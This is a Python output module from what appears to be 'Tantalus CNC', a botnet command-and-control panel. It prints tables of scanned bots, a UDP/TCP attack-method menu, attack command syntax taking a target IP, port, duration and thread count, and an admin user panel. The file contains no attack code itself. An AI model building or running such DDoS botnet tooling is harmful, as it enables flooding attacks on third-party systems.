#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: core/other/output.py
"""

import os

from tabulate import tabulate

from core.other.config import *
from core.other.colors import *

def clear(): os.system('cls')
def plus(string: str): print("\n    {}[+]{} {}\n".format(G, E, string))
def warn(string: str): print("\n    {}[!]{} {}\n".format(R, E, string))
def info(string: str): print("\n    {}[i]{} {}\n".format(B, E, string))
def test(string: str): print("\n    {}[*]{} {}\n".format(Y, E, string))

def print_scanned_bots(scanned_bots: list[tuple[int, str, int, str]]):
    """prints the scanned bots using tabulate

    :param list scanned_bots: list of pinged bots created using the Bot dataclass
    :return: None
    """

    table = [
        [i+1, ip, port, "{}{}{}".format(G if status == "Alive" else R, status, E)]
        for (i, ip, port, status) in scanned_bots
    ]
    print(f"\n{E}"+tabulate(table, headers=["ID", "IP", "Port", "Status"], tablefmt="pretty"), "\n")

def print_logo(c1=G, c2=R):
    """prints the Tantalus banner

    :param str c1: color 1, default green
    :param str c2: color 2, default red
    """

    os.system('cls')
    print(f"""{E}
                    *********************************
                    *       Tantalus CNC {c2}0.1{E}        *
                    *       {c2}github.com/codeuk{E}       *
                    *                               *
                    *   ready to recieve commands   *
                    *********************************
    """)

def print_attack_methods(c1=R, c2=E):
    """prints the attack methods

    :param str c1: color 1, default red
    :param str c2: color 2, default reset
    """

    print(f"""
    {c1}UDP{c2}...............+Finished
    {c1}TCP{c2}.............../In Development
	""")

def print_help(c1=R, c2=E):
    """prints the default commands

    :param str c1: color 1, default red
    :param str c2: color 2, default reset
    """

    print(f"""
    {c1}attack{c2}............/<method> <ip> <port> <minutes> <threads>

    {c1}admin{c2}.............+displays admin panel
    {c1}methods{c2}...........+displays Methods
    {c1}bots{c2}..............+list bots
    {c1}ping{c2}..............+ping bots
    {c1}clear{c2}.............+clear terminal
    {c1}account{c2}.........../account information
    {c1}logout{c2}............+logout
    {c1}exit{c2}..............+exit Tantalus
    """)

def print_admin_panel(c1=M, c2=E):
    """prints the default commands

    :param str c1: color 1, default magenta
    :param str c2: color 2, default reset
    """

    print(f"""{c2}[tantalus] Admin Panel

    {c1}users{c2}......................+view user database
    {c1}add <user> <pass>{c2}..........+adds new user to db
    {c1}remove <user>{c2}..............-removes user from db
    {c1}delete{c2}.....................-deletes all users
    {c1}main{c2}.......................+returns to main menu
    """)